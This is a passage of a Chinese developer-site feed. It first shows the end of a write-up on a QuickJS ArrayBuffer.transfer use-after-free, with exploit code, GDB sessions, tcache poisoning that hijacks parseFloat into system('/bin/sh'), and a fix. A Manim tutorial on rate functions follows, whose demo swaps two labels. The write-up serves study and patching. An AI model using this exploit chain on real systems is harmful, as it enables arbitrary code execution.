ta6[<span class="hljs-number">4</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">6</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">7</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">8</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">9</span>] = system;
ta6[<span class="hljs-number">11</span>] = <span class="hljs-number">0x68732f6e69622fn</span>;
<span class="hljs-keyword">let</span> num = <span class="hljs-built_in">parseFloat</span>(<span class="hljs-number">5.20</span>);
</code></pre>
<h4 data-id="heading-28">Exploit执行流程图</h4>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">JavaScript层:</span>
parseFloat(1.1)
    ↓
<span class="hljs-section">QuickJS内部:</span>
查找js_parseFloat函数指针
    ↓
从map_addr + 0x48位置加载函数指针
    ↓
⚠️ 我们已经覆盖为system()地址
    ↓
<span class="hljs-section">准备函数调用:</span>
RDI = 参数指针 (指向我们控制的内存)
    ↓
⚠️ RDI指向heap_base + 0x19c0 = <span class="hljs-string">"/bin/sh"</span>
    ↓
call [劫持的函数指针]
    ↓
<span class="hljs-section">实际执行:</span>
system(<span class="hljs-string">"/bin/sh"</span>)
    ↓
🎉 获得shell!
</code></pre>
<h4 data-id="heading-29">内存布局详解</h4>
<p>在利用链的最后阶段，目标地址<code>map_addr</code>的内存布局如下：</p>
<pre><code class="hljs language-ini" lang="ini">heap_base + 0x3120 (map_addr):
┌────────────────────┬─────────────────────────────────┐
│ Offset │ Value     │ Purpose                         │
├────────────────────┼─────────────────────────────────┤
│ +0x00  │ binsh_loc │ 指向"/bin/sh"字符串              │
│ +0x08  │ 0x51      │ Fake chunk size                 │
│ +0x10  │ flags     │ Object flags                    │
│ +0x18  │ list_ptr  │ Linked list pointer (稳定性)     │
│ +0x20  │ list_ptr  │ Linked list pointer             │
│ +0x28  │ padding   │                                 │
│ +0x30  │ list_ptr  │ Linked list pointer             │
│ +0x38  │ list_ptr  │ Linked list pointer             │
│ +0x40  │ list_ptr  │ Linked list pointer             │
│ +0x48  │ system()  │ ★ js_parseFloat函数指针 ★       │
│ +0x50  │ padding   │                                 │
│ +0x58  │ "/bin/sh" │ ★ 命令字符串 ★                  │
│ +0x60  │ ...       │                                 │
└────────────────────┴─────────────────────────────────┘

调用parseFloat时的寄存器状态:
<span class="hljs-attr">RIP</span> = system()地址
<span class="hljs-attr">RDI</span> = heap_base + <span class="hljs-number">0</span>x19c0 (指向<span class="hljs-string">"/bin/sh"</span>)
<span class="hljs-attr">RSI</span> = ... (不重要)
<span class="hljs-attr">RDX</span> = ... (不重要)
</code></pre>
<h4 data-id="heading-30">调试技巧与常见问题</h4>
<p>在实际利用过程中，可能遇到以下问题：</p>
<h5 data-id="heading-31">问题1：堆布局不稳定</h5>
<p><strong>现象</strong>：有时候泄露的地址不正确，或者tcache投毒失败</p>
<p><strong>原因</strong>：QuickJS的内存分配行为受到很多因素影响：</p>
<ul>
<li>脚本中的变量数量</li>
<li>注释的长度</li>
<li>字符串字面量的数量</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 调整这些参数来稳定堆布局</span>
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);  <span class="hljs-comment">// 可能需要调整大小</span>
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-comment">// 添加更多临时对象</span>
<span class="hljs-keyword">const</span> stabilizer1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> stabilizer2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
</code></pre>
<h5 data-id="heading-32">问题2：偏移量不匹配</h5>
<p><strong>现象</strong>：计算出的libc_base或heap_base看起来不对</p>
<p><strong>原因</strong>：不同的libc版本和环境有不同的偏移</p>
<p><strong>解决方案</strong>：使用GDB确定正确的偏移</p>
<pre><code class="hljs language-bash" lang="bash">gdb ./bin/qjs
(gdb) b js_array_buffer_transfer
(gdb) run exploit.js
<span class="hljs-comment"># 在泄露后断点</span>
(gdb) vmmap
<span class="hljs-comment"># 找到libc和heap的真实地址</span>
(gdb) p/x leaked_value
(gdb) p/x libc_base
<span class="hljs-comment"># 计算差值得到正确偏移</span>
</code></pre>
<h5 data-id="heading-33">问题3：程序崩溃</h5>
<p><strong>现象</strong>：在写入payload后程序crash</p>
<p><strong>原因</strong>：破坏了关键的内存结构</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 在写入关键数据前，先用安全值初始化</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
    ta6[i] = <span class="hljs-number">1n</span>;  <span class="hljs-comment">// 或者其他安全值</span>
}

<span class="hljs-comment">// 然后只覆盖必要的字段</span>
ta6[<span class="hljs-number">9</span>] = system;  <span class="hljs-comment">// 只改函数指针</span>
</code></pre>
<h3 data-id="heading-34">GDB调试实战</h3>
<h4 data-id="heading-35">设置断点</h4>
<pre><code class="hljs language-bash" lang="bash">gdb ./bin/qjs
(gdb) <span class="hljs-built_in">set</span> args exploit.js

<span class="hljs-comment"># 在关键函数下断点</span>
(gdb) b js_array_buffer_transfer
(gdb) b *0xa659b  <span class="hljs-comment"># detached标志设置处</span>
(gdb) b js_parseFloat
(gdb) b system

(gdb) run
</code></pre>
<h4 data-id="heading-36">检查ArrayBuffer状态</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 在transfer()入口
(gdb) print *(JSArrayBuffer*)$r8
$1 = {
  byte_length = 256,
  max_byte_length = -1,
  detached = 0,        # 未detach
  shared = 0,
  data = 0x555556789000,
  array_list = {
    next = 0x55555678a000,
    prev = 0x55555678a000
  },
  opaque = 0x0,
  free_func = 0x555555567890 &lt;js_array_buffer_free&gt;
}

# 继续到detached设置后
(gdb) ni
...
(gdb) print *(JSArrayBuffer*)$r8
$2 = {
  byte_length = 0,     # ✅ 已清零
  detached = 1,        # ✅ 已标记
  data = 0x0,          # ✅ 已清空
  array_list = {       # ❌ 链表还在
    next = 0x55555678a000,
    prev = 0x55555678a000
  },
  ...
}
</code></pre>
<h4 data-id="heading-37">检查TypedArray状态</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 找到array_list中的第一个TypedArray
(gdb) set $ta = (JSTypedArray*)($r8-&gt;array_list.next)
(gdb) print *$ta
$3 = {
  link = {next = ..., prev = ...},
  obj = 0x55555678b000,
  buffer = 0x55555678c000,
  offset = 0,
  length = 64          # ❌ 应该是0！
}

# 查看对应的JSObject
(gdb) print $ta-&gt;obj-&gt;u.typed_array
$4 = {
  length = 64,         # ❌ 应该是0！
  data = 0x555556789000  # ❌ 应该是NULL！
}

# 这就是UAF的证据！
</code></pre>
<h4 data-id="heading-38">验证Tcache投毒</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 在投毒后
(gdb) x/4gx $heap_addr
0x555556789000: 0x0000555556789100  # next指针(XORed)
0x555556789008: 0x0000000000000000
0x555556789010: 0x0000000000000000
0x555556789018: 0x0000000000000000

# 检查投毒后的next
(gdb) print/x *(uint64_t*)$heap_addr
$5 = 0x3120 ^ 0x555556789  # 指向map_addr！
</code></pre>
<h4 data-id="heading-39">验证函数指针劫持</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 检查map_addr内存
(gdb) x/20gx $map_addr
0x555556789120: 0x00005555567891c0  # binsh location
0x555556789128: 0x0000000000000051  # size
0x555556789130: 0x000c010000000002  # flags
...
0x555556789168: 0x00007ffff7e58750  # system() ← 劫持！
...
0x555556789178: 0x0068732f6e69622f  # "/bin/sh"

# 在parseFloat调用前
(gdb) b *js_parseFloat_caller
(gdb) c
(gdb) print/x $rip
(gdb) print/x $rdi
$6 = 0x5555567891c0  # 指向"/bin/sh" ✅

# 单步进入
(gdb) si
# 应该进入system而不是js_parseFloat！
</code></pre>
<h3 data-id="heading-40">漏洞修复</h3>
<h4 data-id="heading-41">正确的修复方案</h4>
<pre><code class="hljs language-c" lang="c">JSValue <span class="hljs-title function_">js_array_buffer_transfer</span><span class="hljs-params">(...)</span> {
    <span class="hljs-comment">// ... 前面代码不变 ...</span>
    
    <span class="hljs-keyword">if</span> (new_len) {
        <span class="hljs-comment">// ... 数据转移代码 ...</span>
        
DETACH_AND_RETURN:
        <span class="hljs-comment">// ✅ 方案1: 调用现有的正确实现</span>
        JS_DetachArrayBuffer(ctx, this_val);
        
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(...);
        
        <span class="hljs-comment">/* ✅ 方案2: 手动实现完整detach逻辑
        
        // 遍历所有TypedArray视图
        struct list_head *el, *el1;
        list_for_each_safe(el, el1, &amp;v13-&gt;array_list) {
            JSTypedArray *ta = list_entry(el, JSTypedArray, link);
            JSObject *view = ta-&gt;obj;
            
            // 更新每个视图的状态
            if (view-&gt;class_id != JS_CLASS_DATAVIEW) {
                view-&gt;u.typed_array.length = 0;
                view-&gt;u.typed_array.data = NULL;
            }
        }
        
        // 最后才标记buffer为detached
        v13-&gt;detached = 1;
        v13-&gt;data = 0;
        v13-&gt;byte_length = 0;
        
        return js_array_buffer_constructor3(...);
        */</span>
    }
    
    <span class="hljs-comment">// new_len == 0的情况已经正确处理了</span>
    <span class="hljs-keyword">else</span> {
        JS_DetachArrayBuffer(ctx, this_val);
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(...);
    }
}
</code></pre>
<h4 data-id="heading-42">修复效果验证</h4>
<p>修复后，运行PoC应该得到：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">[Phase <span class="hljs-number">4</span>] Testing UAF: Reading <span class="hljs-keyword">from</span> detached TypedArray...
  [*] Attempting <span class="hljs-keyword">to</span> read ta1[<span class="hljs-number">0</span>] (should fail but won<span class="hljs-comment">'t)...</span>

<span class="hljs-symbol">TypeError:</span> ArrayBuffer <span class="hljs-built_in">is</span> detached
    at &lt;anonymous&gt;:<span class="hljs-number">1</span>:<span class="hljs-number">18</span>

[✓] NO UAF DETECTED (Expected secure behavior)
</code></pre>
<h3 data-id="heading-43">总结</h3>
<h4 data-id="heading-44">漏洞本质</h4>
<p>这个漏洞的核心是<strong>状态同步不完整</strong>：</p>
<ol>
<li>ArrayBuffer对象被正确标记为detached</li>
<li>但TypedArray视图的状态没有同步更新</li>
<li>导致TypedArray持有指向已释放内存的悬空指针</li>
<li>形成典型的Use-After-Free漏洞</li>
</ol>
<h4 data-id="heading-45">利用链回顾</h4>
<p>完整的利用链包括：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[1]</span> UAF触发
    ↓ (transfer()不更新TypedArray)
<span class="hljs-selector-attr">[2]</span> Unsorted bin泄露libc
    ↓ (大块释放进unsorted bin保留fd/bk指针)
<span class="hljs-selector-attr">[3]</span> Tcache泄露heap
    ↓ (SAFE_LINKING XOR可逆)
<span class="hljs-selector-attr">[4]</span> Tcache投毒
    ↓ (UAF写next指针)
<span class="hljs-selector-attr">[5]</span> 任意地址分配
    ↓ (tcache返回我们控制的地址)
<span class="hljs-selector-attr">[6]</span> 任意写入
    ↓ (覆写函数指针)
<span class="hljs-selector-attr">[7]</span> RIP劫持
    ↓ (parseFloat() → <span class="hljs-built_in">system</span>())
<span class="hljs-selector-attr">[8]</span> Getshell!
</code></pre>
<h4 data-id="heading-46">关键技术点</h4>
<ol>
<li><strong>UAF成因分析</strong>：对比正确实现（resize/detach）理解问题根源</li>
<li><strong>SAFE_LINKING绕过</strong>：理解glibc 2.32+的指针保护机制</li>
<li><strong>Tcache投毒</strong>：经典堆利用技术的应用</li>
<li><strong>函数指针劫持</strong>：选择合适的目标和触发方式</li>
<li><strong>参数控制</strong>：利用调用约定控制RDI指向"/bin/sh"</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)]]></title>    <link>https://juejin.cn/post/7575313772988186665</link>    <guid>https://juejin.cn/post/7575313772988186665</guid>    <pubDate>2025-11-23T06:27:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575313772988186665" data-draft-id="7575442779038548010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)"/> <meta itemprop="keywords" content="Python,动效,后端"/> <meta itemprop="datePublished" content="2025-11-23T06:27:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:27:44.000Z" title="Sun Nov 23 2025 06:27:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你在制作Manim动画时，是否遇到过这样的困境？</p>
<p>“代码写得天衣无缝，运行流畅，出来的动画却总觉得哪里不对劲？”</p>
<p>虽然物体确实从 A 移动到了 B，但看起来就像是老旧的工业机器人在干活——僵硬、死板，甚至有点无聊。</p>
<p>其实，你的动画离 <strong>“丝滑”</strong> 和 <strong>“专业”</strong>，往往只差这一个参数的距离：<code>rate_func</code> <strong>(速率函数)</strong>。</p>
<p>今天，我们就来聊聊 Manim 中这个不起眼但至关重要的参数，看看如何通过控制 <strong>“时间的流速”</strong>，让你的数学动画不仅能动，而且动得有节奏、有灵魂。</p>
<h2 data-id="heading-0">1. 什么是 Rate Function？（给时间的进度条）</h2>
<p>在 <code>Manim</code> 中，当你写下 <code>.animate.shift(RIGHT)</code> 时，默认发生了什么？</p>
<p>如果你觉得动画只是简单的“在 <code>Run Time</code> 时间内移动距离 <code>RIGHT</code>”，那只对了一半。<code>Rate Function</code> 本质上是<strong>动画完成度与时间的关系</strong>。</p>
<p>想象一下你在看视频时的进度条：</p>
<ul>
<li><strong>输入 (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span><strong>)</strong>：当前时间过去了多少（从 0 到 1，代表 0% 到 100% 的时间）。</li>
<li><strong>输出 (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></span><strong>)</strong>：动画实际上完成了多少（从 0 到 1，代表 0% 到 100% 的进度）。</li>
</ul>
<p><strong>默认的魔法</strong>：<code>Smooth</code></p>
<p>Manim 的默认 <code>rate_func</code> 是 <code>smooth</code>。
这符合物理世界的惯性定律：<strong>起步时慢（加速），中间快，快结束时慢（减速）</strong>。</p>
<p>这就是为什么默认的动画看起来比较自然。</p>
<p>如果我们把它换成 <code>linear</code>（线性），物体就会瞬间以最大速度启动，最后瞬间急停，看起来就会很像 <strong>“PPT 动画”</strong>。</p>
<h2 data-id="heading-1">2. 常用函数图鉴：选对“调味料”</h2>
<p><code>Manim</code>内置了一大堆写好的函数，位于 <code>manim.utils.rate_functions</code>。</p>
<p>我们可以把它们看作是给动画调味的香料。</p>
<p>为了方便演示，我们假设我们要移动一个小球。</p>
<h3 data-id="heading-2">2.1. 基础三剑客</h3>
<ul>
<li><code>linear</code> <strong>(匀速)</strong>
<ul>
<li><strong>效果</strong>：机械感强，速度恒定。</li>
<li><strong>适用场景</strong>：旋转的齿轮、循环滚动的背景、匀速扫描的雷达。</li>
</ul>
</li>
<li><code>smooth</code> <strong>(默认)</strong>
<ul>
<li><strong>效果</strong>：两头慢，中间快。</li>
<li><strong>适用场景</strong>：绝大多数物体的移动、缩放。</li>
</ul>
</li>
<li><code>rush_into</code> / <code>rush_from</code>
<ul>
<li><strong>效果</strong>：
<ul>
<li><code>rush_into</code>: 越走越快，最后“砰”地撞线（只有加速）。</li>
<li><code>rush_from</code>: 一开始很快，慢慢停下来（只有减速）。</li>
</ul>
</li>
<li><strong>适用场景</strong>：连续动作的衔接。比如小球飞入画面停下（<code>rush_from</code>），或者发射出去（<code>rush_into</code>）。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">2.2. 动感特效组</h3>
<ul>
<li><code>there_and_back</code> <strong>(往返)</strong>
<ul>
<li><strong>效果</strong>：走到终点，又原路返回起点。</li>
<li><strong>适用场景</strong>：强调某个东西。比如把公式放大一下再缩回去，告诉观众“看这里！”。</li>
</ul>
</li>
<li><code>wiggle</code> <strong>(摆动)</strong>
<ul>
<li><strong>效果</strong>：像果冻一样左右晃动一下。</li>
<li><strong>适用场景</strong>：表示“错误”、“拒绝”或者引起注意。</li>
</ul>
</li>
<li><code>running_start</code> <strong>(助跑)</strong>
<ul>
<li><strong>效果</strong>：先向后退一点点，然后猛地向前冲。</li>
<li><strong>适用场景</strong>：想要表现物体很有力量感，或者像卡通片里的冲刺效果。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2.3. 物理模拟组</h3>
<ul>
<li><code>ease_out_bounce</code><strong>(落地反弹)</strong>
<ul>
<li><strong>效果</strong>：像篮球落地一样，到底部后弹跳几次再停下。</li>
<li><strong>适用场景</strong>：文字掉落、物体自由落体。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">3. 动手写个 Demo</h2>
<p>光说不练假把式。下面的示例代码可以直观感受不同函数的区别：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> manim <span class="hljs-keyword">import</span> *


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RateFuncComparison</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 定义我们想对比的函数</span>
        funcs = [
            linear,
            smooth,
            rush_from,
            rush_into,
            there_and_back,
            rate_functions.ease_out_bounce,
        ]
        labels = [
            <span class="hljs-string">"Linear"</span>,
            <span class="hljs-string">"Smooth"</span>,
            <span class="hljs-string">"Rush Into"</span>,
            <span class="hljs-string">"Rush From"</span>,
            <span class="hljs-string">"There &amp; Back"</span>,
            <span class="hljs-string">"Bounce"</span>,
        ]

        <span class="hljs-comment"># 创建圆点和文字</span>
        group = VGroup()
        <span class="hljs-keyword">for</span> i, (func, label_text) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(funcs, labels)):
            dot = Dot(color=TEAL)
            label = Text(label_text, font_size=<span class="hljs-number">20</span>).next_to(dot, LEFT)
            row = VGroup(label, dot)
            group.add(row)

        <span class="hljs-comment"># 竖直排列</span>
        group.arrange(DOWN, buff=<span class="hljs-number">0.5</span>).to_edge(LEFT)
        self.add(group)

        <span class="hljs-comment"># 制作动画：让所有点同时向右移动</span>
        <span class="hljs-comment"># 注意：我们在这里分别指定了不同的 rate_func</span>
        anims = []
        <span class="hljs-keyword">for</span> item, func <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(group, funcs):
            dot = item[<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取组里的 Dot</span>
            anims.append(dot.animate(rate_func=func, run_time=<span class="hljs-number">3</span>).shift(RIGHT * <span class="hljs-number">4</span>))

        self.play(*anims)
</code></pre>
<p>运行后你会发现，虽然大家的 <code>run_time</code> 都是3秒，移动距离一样，但“性格”截然不同。</p>
